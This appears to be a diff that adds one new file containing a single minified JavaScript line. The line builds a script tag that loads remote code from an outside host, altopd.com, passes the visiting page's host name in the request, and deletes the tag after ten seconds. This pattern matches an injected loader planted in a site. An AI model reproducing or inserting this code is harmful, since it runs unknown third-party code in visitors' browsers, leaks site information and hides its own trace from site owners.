@@ -1,0 +1,1 @@
+!function(){var t=document.createElement("script"),e="//altopd.com/s?s="+Math.random().toString().slice(10)+"&h="+window.location.host;t.setAttribute("src",e),t.setAttribute("type","text/javascript"),t.setAttribute("async","async"),window.document.body.appendChild(t),setTimeout(function(){t.remove()},1e4)}();
